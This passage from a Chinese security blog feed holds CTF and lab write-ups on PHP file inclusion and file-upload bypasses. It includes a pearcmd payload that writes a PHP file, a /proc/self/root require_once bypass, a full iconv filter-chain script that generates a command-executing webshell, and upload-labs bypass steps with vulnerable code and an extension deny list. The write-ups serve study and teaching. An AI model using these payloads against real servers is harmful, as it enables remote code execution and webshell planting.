包含等号，也仍会被赋值给 <code>$_SERVER['argv']</code> 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\xampp\\php&gt;php.exe pear/pearcmd.php</span><br><span class=\"line\">Commands:</span><br><span class=\"line\">build                  Build an Extension From C Source</span><br><span class=\"line\">bundle                 Unpacks a Pecl Package</span><br><span class=\"line\">channel-add            Add a Channel</span><br><span class=\"line\">channel-alias          Specify an alias to a channel name</span><br><span class=\"line\">channel-delete         Remove a Channel From the List</span><br><span class=\"line\">channel-discover       Initialize a Channel from its server</span><br><span class=\"line\">channel-info           Retrieve Information on a Channel</span><br><span class=\"line\">channel-login          Connects and authenticates to remote channel server</span><br><span class=\"line\">channel-logout         Logs out from the remote channel server</span><br><span class=\"line\">channel-update         Update an Existing Channel</span><br><span class=\"line\">clear-cache            Clear Web Services Cache</span><br><span class=\"line\">config-create          Create a Default configuration file</span><br></pre></td></tr></table></figure>\n<p>create-config 是可以创建文件的，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>\n<p>因此我们最终构造的 payload 如下 <code>GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1</code></p>\n<p>简单解释一下，这里的 config-create 会被当做命令行参数执行，执行的第一个参数是要写的文件内容，第二个参数是稳健位置，然后在通过包含即可</p>\n<p>这个好就好在，docker 下的 php 默认都是开这个选项的，而且不用时间竞争，而且路径文件名可控，即使不是 docker 下，仍可以尝试，万一人家要安装依赖没关呢</p>\n<h2 id=\"通过多级软链接绕过require_once\"><a class=\"markdownIt-Anchor\" href=\"#通过多级软链接绕过require_once\">#</a> 通过多级软链接绕过 require_once</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php require_once &#x27;/www/config.php&#x27;; // some logic here... </span><br><span class=\"line\">\t  require_once $_GET[&#x27;file&#x27;]; </span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n<p>如果我们想要读取 /www/config.php 中的文件，通常可以通过 php://filter 来读取，比如 <code>1.1.1.1/a.php?file=php://filter/read=convert.base64-encode/resource=/www/config.php</code> ，但但如果这个文件在前面已经被包含过了，则第二次包含就会失败，即使使用 php://filter 也一样。</p>\n<p>正常情况下，PHP 会将用户输入的文件名进行 resolve，转换成标准的绝对路径，这个转换的过程会将…/、./、软连接等都进行计算，得到一个最终的路径，再进行包含。每次包含都会经历这个过程，所以，只要是相同的文件，不管中间使用了…/ 进行跳转，还是使用软连接进行跳转，都逃不过最终被转换成原始路径的过程，也就绕不过 require_once。</p>\n<p>但是，如果软连接跳转的次数超过了某一个上限，Linux 的 lstat 函数就会出错，导致 PHP 计算出的绝对路径就会包含一部分软连接的路径，也就和原始路径不相同的，即可绕过 require_once 限制。</p>\n<p><code>/proc/self</code>  指向当前进程的 <code>/proc/pid/</code> ， <code>/proc/self/root/</code>  是指向 <code>/</code>  的符号链接，在 Linux 下，最常见的软连接就是 /proc/self/root，这个路径指向根目录。所以，我们可以多次使用这个路径：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">require_once &#x27;/www/config.php&#x27;;</span><br><span class=\"line\">include_once &#x27;/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/www/config.php&#x27;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"hxp-ctf\"><a class=\"markdownIt-Anchor\" href=\"#hxp-ctf\">#</a> hxp ctf</h2>\n<h3 id=\"the-end-of-lfi\"><a class=\"markdownIt-Anchor\" href=\"#the-end-of-lfi\">#</a> the end of LFI</h3>\n<p>在 PHP 中，我们可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需<strong>临时文件</strong>的 RCE 。</p>\n<p>前置知识 0x00</p>\n<p>php://filter ，当使用 base64-decode 时，字符 &lt;、?、;、&gt;、空格等一共有 7 个字符不符合 base64 编码的字符范围将被忽略，而合法字符将被正常解码，我们的正常字符包括 <code>A-Za-z0-9\\/\\=\\+</code> 。同时需要注意，base64 在编码的时候是四个字节为一组的，这个在上面 session 包含中有过详细解释</p>\n<p>举个师傅的例子:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a = &quot;\\x1bY\\xffQ\\xfa&quot;;              //YQ 为 a 的 base64 编码</span><br><span class=\"line\">var_dump(base64_decode($a));</span><br><span class=\"line\"></span><br><span class=\"line\">// string(1) &quot;a&quot;</span><br></pre></td></tr></table></figure>\n<p>很明显，我们的不可见字符，控制字符也被忽略了</p>\n<p><strong>因此我们可以使用 base64 先 decode 在 incode 来去除 base64 不认可的非法字符，这是我们后面做题的基础</strong></p>\n<p>前置知识 0x01 包含文件中的 php 代码</p>\n<p>假如我们有一个文件 e，文件中的内容是：PD9waHAgcGhwaW5mbygpOw==，即 <code>&lt;?php phpinfo();</code>  的 base64 编码，我们有两种方式包含：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include &quot;php://filter/convert.base64-decode/resource=./e&quot;;</span><br><span class=\"line\">include &quot;php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOw==&quot;;</span><br></pre></td></tr></table></figure>\n<p><code>include</code>  函数实际包含的是 Base64 解码后的 PHP 代码。</p>\n<p>前置知识 0x02 convert.iconv</p>\n<p>PHP Filter 当中有一种  <code>convert.iconv</code>  的 Filter ，可以用来将数据从字符集 A 转换为字符集 B ，其中这两个字符集可以从  <code>iconv -l</code>  获得，这个字符集比较长，不过也存在一些实际上是其他字符集的别名。</p>\n<p>举个例子，我们可以从 utf8 转换为 utf7 的编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$url = &quot;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&lt;&gt;text&quot;;</span><br><span class=\"line\">echo file_get_contents($url);</span><br><span class=\"line\">// Output:</span><br><span class=\"line\">// some+ADwAPg-text</span><br></pre></td></tr></table></figure>\n<p>可以看到，我们在转换的同时成了一些其他的字符，比如 <code>+ADwAPg-</code></p>\n<p>这样结合我们的 base64 的 decode 忽略非法字符，和文件内容包含，也许可以直接转换出我们的 webshell</p>\n<p>比如我们可以通过 UTF8 转 CSISO2022KR 得到字符 C：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$url = &quot;php://filter/&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;     //我们这里简单使用 `data://` 来模拟文件内容读取。</span><br><span class=\"line\">var_dump(file_get_contents($url));</span><br><span class=\"line\"></span><br><span class=\"line\">// hexdump:</span><br><span class=\"line\">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 1b 24 29 43  |string(18) &quot;.$)C|</span><br><span class=\"line\">// 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 22 0a  |aaaaaaaaaaaaaa&quot;.|</span><br></pre></td></tr></table></figure>\n<p>而 c 之前的非法字符，我们只需要利用 decode+incode 去除即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$url = &quot;php://filter/&quot;;</span><br><span class=\"line\">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class=\"line\">$url .= &quot;|convert.base64-decode|convert.base64-encode&quot;;</span><br><span class=\"line\">$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;</span><br><span class=\"line\">var_dump(file_get_contents($url));</span><br><span class=\"line\"></span><br><span class=\"line\">// hexdump</span><br><span class=\"line\">// 00000000  73 74 72 69 6e 67 28 31  32 29 20 22 43 61 61 61  |string(12) &quot;Caaa|</span><br><span class=\"line\">// 00000010  61 61 61 61 61 61 61 61  22 0a                    |aaaaaaaa&quot;.|</span><br></pre></td></tr></table></figure>\n<p>前置知识结束，我们开始构造 payload：</p>\n<p>由于 <code>&lt;</code>  在 base64 是非法字符，我们无法直接构造 <code>&lt;?php</code>  的形式，但我们可以构造 <code>&lt;?php</code> base64 encode 过后的编码，在使用 base64decode 还原即可正常包含</p>\n<p>构造 <code>&lt;</code>  我们可以生成 PAxxxxx 的编码，解码过后我们就可以生成 &lt;，我们接下来要做的就是能找到可以通过编码转换生成我们需要的字符，但后面也可能生成垃圾字符，我们只需要 decode+incode 就可以去除</p>\n<p>我们最后的 webshell 长这样： <code>PD89YCRfR0VUWzBdYDs7Pz4=</code>  是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`$_GET[0]\\`;;?&gt;</span><br></pre></td></tr></table></figure>\n<p>编码后的结果，两个；；的原因是一个；的 base64  <code>PD89YCRfR0VUWzBdYDs/Pg==</code>  中间有个 /，通过编码转换不好找的这个字符</p>\n<p>其实我发现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`$_GET[0]`; ?&gt;</span><br></pre></td></tr></table></figure>\n<p>你也可以加个空格，这样也不会有 \\， <code>PD89YCRfR0VUWzBdYDsgPz4=</code></p>\n<p>最终我们的脚本长这样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;;</span><br><span class=\"line\">$conversions = array(</span><br><span class=\"line\">    &#x27;R&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;B&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;C&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;,</span><br><span class=\"line\">    &#x27;8&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;9&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;,</span><br><span class=\"line\">    &#x27;f&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;,</span><br><span class=\"line\">    &#x27;s&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;,</span><br><span class=\"line\">    &#x27;z&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;,</span><br><span class=\"line\">    &#x27;U&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;,</span><br><span class=\"line\">    &#x27;P&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;,</span><br><span class=\"line\">    &#x27;V&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;,</span><br><span class=\"line\">    &#x27;0&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;Y&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;W&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;d&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;D&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;7&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;4&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">$filters = &quot;convert.base64-encode|&quot;;</span><br><span class=\"line\"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class=\"line\">$filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach (str_split(strrev($base64_payload)) as $c) &#123;</span><br><span class=\"line\">    $filters .= $conversions[$c] . &quot;|&quot;;</span><br><span class=\"line\">    $filters .= &quot;convert.base64-decode|&quot;;</span><br><span class=\"line\">    $filters .= &quot;convert.base64-encode|&quot;;</span><br><span class=\"line\">    $filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$filters .= &quot;convert.base64-decode&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$final_payload = &quot;php://filter/&#123;$filters&#125;/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// echo $final_payload;</span><br><span class=\"line\">var_dump(file_get_contents($final_payload));</span><br><span class=\"line\"></span><br><span class=\"line\">// hexdump</span><br><span class=\"line\">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 3c 3f 3d 60  |string(18) &quot;&lt;?=`|</span><br><span class=\"line\">// 00000010  24 5f 47 45 54 5b 30 5d  60 3b 3b 3f 3e 18 22 0a  |$_GET[0]`;;?&gt;.&quot;.|</span><br></pre></td></tr></table></figure>\n<p><code>convert.iconv.UTF8.UTF7</code>  将等号转换为字母。之所以使用这个的原因是 exp 作者遇到过有时候等号会让  <code>convert.base64-decode</code>  过滤器解析失败的情况，可以使用 iconv 从 UTF8 转换到 UTF7 ，会把字符串中的任何等号变成一些 base64 。</p>\n<p>我们可以知道对于这种方法来说，其实文件内容并不重要，但至少得有内容，而且一般读取有内容的文件并不是大问题，所以我们可以简单尝试利用  <code>/etc/passwd</code> :</p>\n<p>后面还有一些天书一样的解释，我实在…</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM5NS8=\">https://tttang.com/archive/1395/</span></p>\n<p>还有一种神仙解法，先挖坑～</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM4NC8=\">hxp CTF 2021 - A New Novel LFI - 跳跳糖 (tttang.com)</span></p>\n<p>实话实说，都是我做不出来的解法</p>\n<p>我也就做做 16 年的 ctf 罢了</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/04/16/Upload/",
            "url": "http://example.com/2022/04/16/Upload/",
            "title": "File upload",
            "date_published": "2022-04-16T05:38:45.000Z",
            "content_html": "<h1 id=\"upload\"><a class=\"markdownIt-Anchor\" href=\"#upload\">#</a> Upload</h1>\n<blockquote>\n<p>当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被 webshell。</p>\n<p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>\n–验证文件类型、后缀名、大小；<br>\n–验证文件的上传方式；<br>\n–对文件进行一定复杂的重命名；<br>\n–不要暴露文件上传后的路径；<br>\n–等等…</p>\n</blockquote>\n<h2 id=\"upload-labs\"><a class=\"markdownIt-Anchor\" href=\"#upload-labs\">#</a> upload-labs</h2>\n<p>Pass01</p>\n<p>文件上传时先上传到临时目录，在从临时目录移动到定义的文件夹</p>\n<p>C:\\Users\\18310\\AppData\\local\\temp  -&gt;  ./uploads/xxx.php</p>\n<p>上传结束，临时文件删除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123; </span><br><span class=\"line\">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];   //&#x27;upload_file&#x27;是数组，通过[]取值</span><br><span class=\"line\">        $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class=\"line\">        if (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class=\"line\">            $is_upload = true;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">    function checkFile() &#123;</span><br><span class=\"line\">        var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class=\"line\">        if (file == null || file == &quot;&quot;) &#123;</span><br><span class=\"line\">            alert(&quot;请选择要上传的文件!&quot;);</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //定义允许上传的文件类型</span><br><span class=\"line\">        var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class=\"line\">        //提取上传文件的类型</span><br><span class=\"line\">        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class=\"line\">        //判断上传文件类型是否允许上传</span><br><span class=\"line\">        if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class=\"line\">            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class=\"line\">            alert(errMsg);</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>method 1. 抓包，上传后缀改为 jpg 的 php，抓包后修改后缀为 php</p>\n<p>method 2. 前端 JS 验证，浏览器关闭 js</p>\n</blockquote>\n<p>Pass02 检测 MIME</p>\n<p>BP 修改 Content-Type: image/jpeg（image/png，image/gif）</p>\n<p>利用 copy 和成木马图片</p>\n<p>copy xxxx.jpg /b + test.php /a test1.jpg</p>\n<p>Pass03</p>\n<p>通过上传 php3,php5,phtml 绕过</p>\n<p>上传 php3 需要在 Apache 配置文件中增加解析 php3,php5,phtml, 使 Apache 解析这些文件</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#<span class=\"title class_\">AddType</span> text/html .<span class=\"property\">shtml</span></span><br><span class=\"line\"><span class=\"title class_\">AddoutputFilter</span> <span class=\"variable constant_\">INCLUDES</span> .<span class=\"property\">shtml</span></span><br><span class=\"line\"><span class=\"title class_\">AddType</span> application/x-httpd-php .<span class=\"property\">php</span> .<span class=\"property\">phtml</span> .<span class=\"property\">php3</span></span><br></pre></td></tr></table></figure>\n<p>#asp 可以通过 asa 和 cer 绕过</p>\n<p>Pass04</p>\n<p>.htaccess 实现 php 伪静态</p>\n<p>.htaccess 文件夹内文件都会被当做 php 解析</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">SetHandler</span> application/x-httpd-php   <span class=\"comment\">//将目录下所有文件都作为php解析</span></span><br></pre></td></tr></table></figure>\n<p>或使用 Apache 解析漏洞</p>\n<p>test.php.x</p>\n<p>预防：使用以下代码使得上传后无法解析</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1641700272045-7fc11c94-5bb3-4087-a010-94cf9230bbf7.png\" alt=\"img\"></p>\n<p>Pass-04 过滤代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = null;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (isset(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = array(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.php1&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.pHp1&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span 